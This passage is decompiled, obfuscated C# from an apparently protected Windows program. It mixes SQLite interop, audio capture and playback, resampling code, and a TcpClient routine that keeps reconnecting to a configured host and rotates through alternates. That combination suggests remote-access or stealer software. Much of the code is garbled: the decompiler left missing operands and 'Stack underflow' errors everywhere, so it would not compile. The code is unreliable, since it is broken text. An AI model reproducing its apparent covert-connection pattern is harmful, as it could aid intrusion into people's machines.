						_009B_0003._007E_009B_0007(stringBuilder, c);
					}
					flag2 = !flag2;
					continue;
				}
				if (c == _0003)
				{
					if (flag2)
					{
						_009B_0003._007E_009B_0007(stringBuilder, c);
						continue;
					}
					list.Add(global::_0002._007E_0006(stringBuilder));
					_009D_0002._007E_0018_0006(stringBuilder, 0);
				}
				else
				{
					_009B_0003._007E_009B_0007(stringBuilder, c);
				}
			}
			if (flag || flag2)
			{
				_0005 = _0080._0014._0001(107379236);
				return null;
			}
			if (global::_001A._007E_0019_0003(stringBuilder) > 0)
			{
				list.Add(global::_0002._007E_0006(stringBuilder));
			}
			return list.ToArray();
		}

		static short[] _0001(_0080._0004 _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0080._0004)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		[DllImport("winmm.dll", EntryPoint = "midiDisconnect")]
		static extern MmResult _0001(IntPtr _0002, IntPtr _0003, IntPtr _0004);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_blob_open")]
		static extern _0080._0017 _0001(IntPtr _0002, byte[] _0003, byte[] _0004, byte[] _0005, long _0006, int _0007, ref IntPtr _0008);

		static int _0001(global::_0017._007F._000F P_0)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Expected I4, but got Unknown
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			((Stream)/*Error near IL_0017: Stack underflow*/).ReadByte();
			int num = ((Stream)/*Error near IL_000b: Stack underflow*/).ReadByte();
			return /*Error near IL_000e: Stack underflow*/| (num << 8);
		}

		static void _0001(global::_0015._0008 P_0)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			EventHandler eventHandler = ((global::_0015._0008)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				_0015_0002._007E_0017_0005(eventHandler, P_0, EventArgs.Empty);
			}
		}

		static bool _0001(global::_0005._0005 _0002, int _0003, _001E._0004 P_2)
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			_0018._0001((_001E._0004)/*Error near IL_0024: Stack underflow*/, (global::_0005._0005)/*Error near IL_0024: Stack underflow*/);
			_001B._0004 obj = (_001B._0004)/*Error near IL_0007: Stack underflow*/;
			bool result = _0018._0001(_0003, global::_0017._0005._0002, P_2, obj);
			_0018._0001(ref obj);
			return result;
		}

		static _007F._0003 _0001(int _0002, int _0003, IntPtr _0004, int _0005, _001D._0001 _0006)
		{
			//IL_0175: Incompatible stack heights: 0 vs 3
			//IL_017f: Incompatible stack heights: 0 vs 1
			//IL_0189: Incompatible stack heights: 0 vs 1
			global::_0015._0003._0003 obj = default(global::_0015._0003._0003);
			global::_0015._0003._0008 obj2 = default(global::_0015._0003._0008);
			_ = _0099._008D_0004;
			_ = _0098._0089_0004;
			object obj3 = (global::_0015._0003._0008)/*Error near IL_0024: Stack underflow*/;
			/*Error near IL_017f: Stack underflow*/(obj3);
			/*Error near IL_0189: Stack underflow*/((int)/*Error near IL_0189: Stack underflow*/);
			IntPtr intPtr = (IntPtr)/*Error near IL_002f: Stack underflow*/;
			obj._0001 = _0098._0089_0004(obj);
			obj._0004 = 1;
			obj._0003 = _0005;
			obj._0005 = _0098._0089_0004(obj2);
			obj._0001 = intPtr;
			obj._0002 = _0003;
			MmResult mmResult = _0018._0001(_0004, ref obj, _001D._0001._0013 | _0006);
			if (mmResult != 0)
			{
				_009B._0091_0004(intPtr);
				throw new global::_0013._0001(mmResult, _0080._0014._0001(107380452));
			}
			obj2 = (global::_0015._0003._0008)_0097._0088_0004(obj._0001, _0091._0080_0004(typeof(global::_0015._0003._0008).TypeHandle));
			_009B._0091_0004(intPtr);
			if (_0018._0001(obj2._0001))
			{
				return new global::_0015._0002(obj2, _0004, _0006, _0002);
			}
			if (_0018._0001(obj2._0001))
			{
				return new global::_0013._0002(obj2, _0004, _0006, _0002);
			}
			if (_0018._0001(obj2._0001))
			{
				return new global::_000F._0002(obj2, _0004, _0006, _0002);
			}
			if (_0018._0001(obj2._0001))
			{
				return new global::_0003._0002(obj2, _0004, _0006, _0002);
			}
			if (obj2._0001 == MixerControlType.Custom)
			{
				return new _007F._0002(obj2, _0004, _0006, _0002);
			}
			throw new InvalidOperationException(_0008_0002._0007_0005(_0080._0014._0001(107379691), obj2._0001));
		}

		static void _0001(_0013 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((_0013)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(_0013).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static _001F._0018 _0001(_0014 _0002, _001F._0018 _0003, string P_2)
		{
			//IL_0003: Invalid comparison between Unknown and O
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			if ((object)/*Error near IL_0005: Stack underflow*/ == null)
			{
				new _001F._0018(global::_0014._0017._0006, DbType.Object);
				return (_001F._0018)/*Error near IL_000d: Stack underflow*/;
			}
			if (global::_0001._001A._0002((string)/*Error near IL_0014: Stack underflow*/))
			{
				return new _001F._0018(global::_0014._0017._0002, DbType.Int64);
			}
			if (global::_0001._001A._0003(P_2))
			{
				return new _001F._0018(global::_0014._0017._0003, DbType.Double);
			}
			if (_0002._0001 != null && _0018._0001((global::_0001._001A)_0002._0001._0001, P_2))
			{
				return new _001F._0018(global::_0014._0017._0007, DbType.DateTime);
			}
			return _0003;
		}

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerClose")]
		static extern MmResult _0001(IntPtr _0002);

		static global::_0010._001C _0001(_001D._0019 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 2
			_0018._0001((_001D._0019)/*Error near IL_001e: Stack underflow*/);
			_ = _008D_0004._0010_000E;
			return (global::_0010._001C)/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_busy_timeout")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_load_extension")]
		static extern _0080._0017 _0001(IntPtr _0002, byte[] _0003, byte[] _0004, ref IntPtr _0005);

		static IntPtr _0001(string _0002)
		{
			//IL_0032: Incompatible stack heights: 0 vs 1
			global::_0013._0018._0001 obj = _0018._0001;
			global::_0013._0018._0001 obj2 = default(global::_0013._0018._0001);
			if (0 == 0)
			{
				obj2 = obj;
			}
			_0018._0001();
			if ((int)/*Error near IL_0014: Stack underflow*/ == 0)
			{
				obj2 = _0018._0001;
			}
			return obj2(_0002);
		}

		static void _0001(_001E._0010 _0002, BinaryReader P_1)
		{
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((BinaryReader)/*Error near IL_0055: Stack underflow*/);
			((_001E._0010)/*Error near IL_000b: Stack underflow*/)._0006 = (_001F._0013)/*Error near IL_000b: Stack underflow*/;
			if (_0002._0006._0001 > 0)
			{
				_0002._0004 = global::_001A._007E_001D_0003(P_1);
				for (int i = 0; i < _0002._0004; i++)
				{
					_0083_0002._007E_008C_0005(P_1, 36);
				}
			}
		}

		static void _0001(MediaFoundationEncoder _0002, bool P_1)
		{
			//IL_0016: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = _0098._008A_0004;
			_0019._0012 obj = ((MediaFoundationEncoder)/*Error near IL_000c: Stack underflow*/)._0001._0001;
			/*Error near IL_001d: Stack underflow*/(obj);
		}

		static _0016 _0001(int _0002, string _0003, DbType _0004, global::_0007._001E P_3)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			_0016 obj = new _0016((string)/*Error near IL_000b: Stack underflow*/, (DbType)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/);
			P_3.Add(obj);
			return obj;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_blob_reopen")]
		static extern _0080._0017 _0001(IntPtr _0002, long _0003);

		static global::_0017._0080 _0001(global::_0013._0017 _0002)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			try
			{
				if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
				{
					global::_0010._001C obj = ((global::_0013._0017)/*Error near IL_000b: Stack underflow*/)._0001;
					if (obj != null)
					{
						global::_0017._0080 obj2 = obj.Connection;
						if (obj2 != null)
						{
							return obj2;
						}
					}
				}
			}
			catch (ObjectDisposedException)
			{
			}
			return null;
		}

		static string _0001(_0080._0017 _0002)
		{
			//IL_0010: Invalid comparison between Unknown and I4
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			if (_0013._0001 == null)
			{
				return null;
			}
			int num = (int)/*Error near IL_002a: Stack underflow*/;
			if ((int)/*Error near IL_0012: Stack underflow*/ < 0 || num >= _0013._0001.Length)
			{
				num = 1;
			}
			return _0013._0001[num];
		}

		static bool _0001(IntPtr _0002, IntPtr _0003, global::_0005._000E _0004)
		{
			//IL_000e: Incompatible stack heights: 0 vs 2
			//IL_0015: Incompatible stack heights: 0 vs 1
			_ = global::_0014._0008._0001;
			new global::_0014._0008((IntPtr)/*Error near IL_0015: Stack underflow*/);
			((List<global::_0014._0008>)/*Error near IL_001c: Stack underflow*/).Add((global::_0014._0008)/*Error near IL_001c: Stack underflow*/);
			return true;
		}

		static void _0001(global::_0018._000E _0002, _001C._0004 P_1)
		{
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 2
			List<_001C._0004> list = ((global::_0018._000E)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			try
			{
				_0002._0001.Remove(P_1);
			}
			finally
			{
				_0091_0002._009D_0005(list);
			}
		}

		static void _0001(_001E._0004 _0002, int _0003, global::_0005._0005 P_2)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			_0018._0001((_001E._0004)/*Error near IL_0036: Stack underflow*/, (global::_0005._0005)/*Error near IL_0036: Stack underflow*/);
			_001B._0004 obj = (_001B._0004)/*Error near IL_0007: Stack underflow*/;
			bool num = _0018._0001(_0003, global::_0017._0005._0001, _0002, obj);
			_0018._0001(ref obj);
			if (!num)
			{
				throw new ArgumentException(_0080._0014._0001(107355700));
			}
		}

		static double _0001(_001F._0019 _0002, int P_1)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005c: Stack underflow*/, (int)/*Error near IL_005c: Stack underflow*/);
			if (_0002._0001[P_1]._0001 != null)
			{
				return _0095_0006._007E_008A_0010(_0002._0001[P_1]._0001._0001, _0002._0001[P_1]._0004);
			}
			throw new InvalidCastException();
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_column_int")]
		static extern int _0001(IntPtr _0002, int _0003);

		static int _0001(int _0002, int _0003, int _0004, float[] _0005, global::_000E._0019 _0006, int P_5)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_000f: Invalid comparison between Unknown and I4
			//IL_0709: Incompatible stack heights: 0 vs 1
			//IL_070f: Incompatible stack heights: 0 vs 1
			//IL_0716: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0009: Stack underflow*/ > 64 || (int)/*Error near IL_0011: Stack underflow*/ < 1)
			{
				return 0;
			}
			if (((global::_000E._0019)/*Error near IL_001d: Stack underflow*/)._000E > 0 && _0006._0005 > 1.0 && _0003 > 0)
			{
				if (_0006._0001 == null)
				{
					_0006._0001 = new global::_000E._0019._0001();
				}
				int num = _0006._000E;
				global::_000E._0019._0001 obj = _0006._0001;
				double num2 = 1.0 / _0006._0005 * (double)_0006._0002;
				double num3 = _0006._0001;
				_0018._0001(num2, num3, obj);
				int num4 = _0006._0006 * _0002;
				int num5 = 0;
				for (int i = 0; i < _0002; i++)
				{
					for (int j = 0; j < num; j++)
					{
						_0018._0001(_0006._0001, _0006._0001, num4 + i, _0006._0001, num4 + i, _0003, _0002, num5++);
					}
				}
			}
			_0006._0006 += _0016_0002._0018_0005(_0003, _0006._0004);
			int num6 = _0006._0006;
			if (_0003 < _0006._0004)
			{
				int num7 = (_0006._0004 - _0003) * 2 + _0006._0008 * 2;
				int num8 = (_0006._0006 + num7) * _0002;
				Array.Resize(ref _0006._0001, num8);
				if (_0006._0001.Length == num8)
				{
					_0007_0003._0086_0006(_0006._0001, _0006._0006 * _0002, num7 * _0002);
					num6 = _0006._0006 + num7;
				}
			}
			int num9 = 0;
			double num10 = _0006._0004;
			double num11 = _0006._0005;
			int num12 = 0;
			int num13 = _0004;
			int num14 = P_5;
			int num15 = 0;
			if (_0006._0008 != 0)
			{
				if (_0006._0005 > 1.0)
				{
					_0018._0001(_0006, 1.0 / (_0006._0005 * 1.03));
				}
				else
				{
					_0018._0001(_0006, 1.0);
				}
				int num16 = _0006._0003;
				int num17 = num6 - num16;
				num15 = num16 / 2 - 1;
				int num18 = 0;
				if (_0002 == 1)
				{
					while (num14-- != 0)
					{
						int num19 = (int)num10;
						if (num19 >= num17 - 1)
						{
							break;
						}
						float[] array = _0006._0001;
						float[] array2 = _0006._0002;
						_0018._0001(array, num18, _0006, _0005, num13, array2, num16, num12 + num19, num10 - (double)num19);
						num13++;
						num10 += num11;
						num9++;
					}
				}
				else if (_0002 == 2)
				{
					while (num14-- != 0)
					{
						int num20 = (int)num10;
						if (num20 >= num17 - 1)
						{
							break;
						}
						float[] array3 = _0006._0001;
						float[] array4 = _0006._0002;
						_0018._0001(num16, num13, num10 - (double)num20, array3, array4, _0006, num12 + num20 * 2, num18, _0005);
						num13 += 2;
						num10 += num11;
						num9++;
					}
				}
				else
				{
					while (num14-- != 0)
					{
						int num21 = (int)num10;
						if (num21 >= num17 - 1)
						{
							break;
						}
						float[] array5 = _0006._0001;
						float[] array6 = _0006._0002;
						_0018._0001(_0005, array5, _0006, num12 + num21 * _0002, num16, num10 - (double)num21, array6, num18, num13, _0002);
						num13 += _0002;
						num10 += num11;
						num9++;
					}
				}
			}
			else if (!_0006._0001)
			{
				if (_0002 == 1)
				{
					while (num14-- != 0)
					{
						int num22 = (int)num10;
						if (num22 >= num6)
						{
							break;
						}
						_0005[num13++] = _0006._0001[num12 + num22];
						num10 += num11;
						num9++;
					}
				}
				else if (_0002 == 2)
				{
					while (num14-- != 0)
					{
						int num23 = (int)num10;
						if (num23 >= num6)
						{
							break;
						}
						num23 += num23;
						_0005[num13] = _0006._0001[num12 + num23];
						_0005[num13 + 1] = _0006._0001[num12 + num23 + 1];
						num13 += 2;
						num10 += num11;
						num9++;
					}
				}
				else
				{
					while (num14-- != 0)
					{
						int num24 = (int)num10;
						if (num24 >= num6)
						{
							break;
						}
						_0099_0002._0010_0006(_0006._0001, num12 + num24 * _0002, _0005, num13, _0002);
						num13 += _0002;
						num10 += num11;
						num9++;
					}
				}
			}
			else if (_0002 == 1)
			{
				while (num14-- != 0)
				{
					int num25 = (int)num10;
					double num26 = num10 - (double)num25;
					if (num25 >= num6 - 1)
					{
						break;
					}
					double num27 = 1.0 - num26;
					int num28 = num12 + num25;
					_0005[num13++] = (float)((double)_0006._0001[num28] * num27 + (double)_0006._0001[num28 + 1] * num26);
					num10 += num11;
					num9++;
				}
			}
			else if (_0002 == 2)
			{
				while (num14-- != 0)
				{
					int num29 = (int)num10;
					double num30 = num10 - (double)num29;
					if (num29 >= num6 - 1)
					{
						break;
					}
					double num31 = 1.0 - num30;
					int num32 = num12 + num29 * 2;
					_0005[num13] = (float)((double)_0006._0001[num32] * num31 + (double)_0006._0001[num32 + 2] * num30);
					_0005[num13 + 1] = (float)((double)_0006._0001[num32 + 1] * num31 + (double)_0006._0001[num32 + 3] * num30);
					num13 += 2;
					num10 += num11;
					num9++;
				}
			}
			else
			{
				while (num14-- != 0)
				{
					int num33 = (int)num10;
					double num34 = num10 - (double)num33;
					if (num33 >= num6 - 1)
					{
						break;
					}
					double num35 = 1.0 - num34;
					int num36 = _0002;
					int num37 = num12 + num33 * _0002;
					while (num36-- != 0)
					{
						_0005[num13++] = (float)((double)_0006._0001[num37] * num35 + (double)_0006._0001[num37 + _0002] * num34);
						num37++;
					}
					num10 += num11;
					num9++;
				}
			}
			if (_0006._000E > 0 && _0006._0005 < 1.0 && num9 > 0)
			{
				if (_0006._0001 == null)
				{
					_0006._0001 = new global::_000E._0019._0001();
				}
				int num38 = _0006._000E;
				global::_000E._0019._0001 obj = _0006._0001;
				double num2 = _0006._0005 * (double)_0006._0002;
				double num3 = _0006._0001;
				_0018._0001(num2, num3, obj);
				int num39 = 0;
				for (int k = 0; k < _0002; k++)
				{
					for (int l = 0; l < num38; l++)
					{
						_0018._0001(_0006._0001, _0005, k, _0005, k, num9, _0002, num39++);
					}
				}
			}
			if (num9 > 0 && num6 > _0006._0006)
			{
				double num40 = (num10 - (double)_0006._0006 + (double)num15) / num11;
				if (num40 > 0.0)
				{
					num9 -= (int)(num40 + 0.5);
					if (num9 < 0)
					{
						num9 = 0;
					}
				}
			}
			int num41 = (int)num10;
			_0006._0004 = num10 - (double)num41;
			_0006._0006 -= num41;
			if (_0006._0006 <= 0)
			{
				_0006._0006 = 0;
			}
			else
			{
				_0099_0002._0010_0006(_0006._0001, num12 + num41 * _0002, _0006._0001, num12, _0006._0006 * _0002);
			}
			return num9;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_value_text16_interop")]
		static extern IntPtr _0001(IntPtr _0002, ref int _0003);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._0015 P_0)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0009: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0015: Stack underflow*/)._0001;
			AsioError num = /*Error near IL_001a: Stack underflow*/(pUnknown);
			string text = _0080._0014._0001(107379650);
			_0018._0001((global::_0017._0015)/*Error near IL_0029: Stack underflow*/, num, text);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_log")]
		static extern void _0001(_0080._0017 _0002, byte[] _0003);

		static _001F._0013 _0001(BinaryReader _0002)
		{
			//IL_0037: Expected O, but got Unknown
			//IL_0048: Expected O, but got Unknown
			//IL_004a: Incompatible stack heights: 0 vs 4
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 3
			new _001F._0013();
			_ = global::_001A._007E_001D_0003;
			/*Error near IL_0051: Stack underflow*/((object)/*Error near IL_0051: Stack underflow*/);
			((_001F._0013)/*Error near IL_0014: Stack underflow*/)._0001 = (int)/*Error near IL_0014: Stack underflow*/;
			/*Error near IL_0014: Stack underflow*/;
			_ = global::_001A._007E_001D_0003;
			int num = /*Error near IL_0021: Stack underflow*/((object)/*Error near IL_0021: Stack underflow*/);
			((_001F._0013)/*Error near IL_0026: Stack underflow*/)._0002 = num;
			((_001F._0013)/*Error near IL_0026: Stack underflow*/)._0001 = _0088_0002._007E_0091_0005(_0002);
			((_001F._0013)/*Error near IL_0037: Stack underflow*/)._0002 = _0088_0002._007E_0091_0005(_0002);
			return (_001F._0013)/*Error near IL_0049: Stack underflow*/;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _0016 _0001(int _0002, DbType _0003, global::_0007._001E _0004, string _0005, string P_4)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			_0016 obj = new _0016((string)/*Error near IL_000c: Stack underflow*/, (DbType)/*Error near IL_000c: Stack underflow*/, (int)/*Error near IL_000c: Stack underflow*/, _0005);
			_0004.Add(obj);
			return obj;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, EntryPoint = "sqlite3_result_text16")]
		static extern void _0001(IntPtr _0002, string _0003, int _0004, IntPtr _0005);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static bool _0001(global::_0008._0001 P_0)
		{
			//IL_00a5: Incompatible stack heights: 0 vs 2
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b9: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_0002._007E_0006;
				_0018._0001(((global::_0008._0001)/*Error near IL_0011: Stack underflow*/)._0001);
				object obj = ((object[])/*Error near IL_0018: Stack underflow*/)[0];
				/*Error near IL_00b9: Stack underflow*/(obj);
				global::_0015._0001._0017 = (string)/*Error near IL_0022: Stack underflow*/;
				if (P_0._0002 > 21)
				{
					global::_0015._0001._0017 = global::_0002._007E_0006(_0018._0001(P_0._0001)[1]);
					if (P_0._0002 > 25)
					{
						P_0._0002 = 0;
					}
				}
				P_0._0002++;
				P_0._0001 = new TcpClient();
				_0096_0006._007E_008B_0010(P_0._0001, global::_0015._0001._0017, global::_0015._0001._0001);
				P_0._0002 = 0;
				return true;
			}
			catch
			{
				_0018._0001(P_0);
				return false;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", EntryPoint = "waveOutWrite")]
		static extern MmResult _0001(IntPtr _0002, _007F._0006 _0003, int _0004);

		[DllImport("msdmo.dll", EntryPoint = "DMOEnum")]
		static extern int _0001([In] ref Guid _0002, global::_000E._0002 _0003, int _0004, [In] global::_0008._0004[] _0005, int _0006, [In] global::_0008._0004[] _0007, out global::_0018._0008 _0008);

		static void _0001(byte[] _0002, int _0003, int _0004, global::_0017._007F._000E P_3)
		{
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			Array.Copy(destinationArray: ((global::_0017._007F._000E)/*Error near IL_000b: Stack underflow*/)._0001, destinationIndex: P_3._0002, sourceArray: (Array)/*Error near IL_0017: Stack underflow*/, sourceIndex: (int)/*Error near IL_0017: Stack underflow*/, length: _0004);
			P_3._0002 += _0004;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_value_bytes16")]
		static extern int _0001(IntPtr _0002);

		static void _0001(_0080._0004 P_0)
		{
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 3
			_ = _0007_0003._0086_0006;
			_ = ((_0080._0004)/*Error near IL_000c: Stack underflow*/)._0001;
			_ = 0;
			IntPtr intPtr = (nint)((_0080._0004)/*Error near IL_0014: Stack underflow*/)._0001.LongLength;
			/*Error near IL_0024: Stack underflow*/((Array)/*Error near IL_0024: Stack underflow*/, (int)/*Error near IL_0024: Stack underflow*/, (int)(nint)intPtr);
		}

		[DllImport("mfplat.dll", EntryPoint = "MFShutdown", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001();

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		unsafe static int _0001(global::_0002._0006 _0002, float[] P_1)
		{
			//IL_01d1: Incompatible stack heights: 0 vs 1
			//IL_01db: Incompatible stack heights: 0 vs 1
			_ = ((global::_0002._0006)/*Error near IL_01db: Stack underflow*/).InputBuffers;
			int num = ((Array)/*Error near IL_000b: Stack underflow*/).Length;
			if (P_1.Length < _0002.SamplesPerBuffer * num)
			{
				throw new ArgumentException(_0080._0014._0001(107379673));
			}
			int num2 = 0;
			if (_0002.AsioSampleType == AsioSampleType.Int32LSB)
			{
				for (int i = 0; i < _0002.SamplesPerBuffer; i++)
				{
					for (int j = 0; j < num; j++)
					{
						P_1[num2++] = (float)(*(int*)((byte*)_0010_0005._0096_000E(_0002.InputBuffers[j]) + (nint)i * (nint)4)) / 2.1474836E+09f;
					}
				}
			}
			else if (_0002.AsioSampleType == AsioSampleType.Int16LSB)
			{
				for (int k = 0; k < _0002.SamplesPerBuffer; k++)
				{
					for (int l = 0; l < num; l++)
					{
						P_1[num2++] = (float)(*(short*)((byte*)_0010_0005._0096_000E(_0002.InputBuffers[l]) + (nint)k * (nint)2)) / 32767f;
					}
				}
			}
			else if (_0002.AsioSampleType == AsioSampleType.Int24LSB)
			{
				for (int m = 0; m < _0002.SamplesPerBuffer; m++)
				{
					for (int n = 0; n < num; n++)
					{
						byte* ptr = (byte*)_0010_0005._0096_000E(_0002.InputBuffers[n]) + m * 3;
						int num3 = *ptr | (ptr[1] << 8) | ((sbyte)ptr[2] << 16);
						P_1[num2++] = (float)num3 / 8388608f;
					}
				}
			}
			else
			{
				if (_0002.AsioSampleType != AsioSampleType.Float32LSB)
				{
					throw new NotImplementedException(_0008_0002._0007_0005(_0080._0014._0001(107379644), _0002.AsioSampleType));
				}
				for (int num4 = 0; num4 < _0002.SamplesPerBuffer; num4++)
				{
					for (int num5 = 0; num5 < num; num5++)
					{
						P_1[num2++] = *(float*)((byte*)_0010_0005._0096_000E(_0002.InputBuffers[num5]) + (nint)num4 * (nint)4);
					}
				}
			}
			return _0002.SamplesPerBuffer * num;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_null")]
		static extern void _0001(IntPtr _0002);

		static int _0001(global::_0017._007F._000E _0002, byte[] _0003, int _0004, int P_3)
		{
			//IL_00b8: Incompatible stack heights: 0 vs 1
			//IL_00be: Incompatible stack heights: 0 vs 1
			//IL_00c4: Incompatible stack heights: 0 vs 2
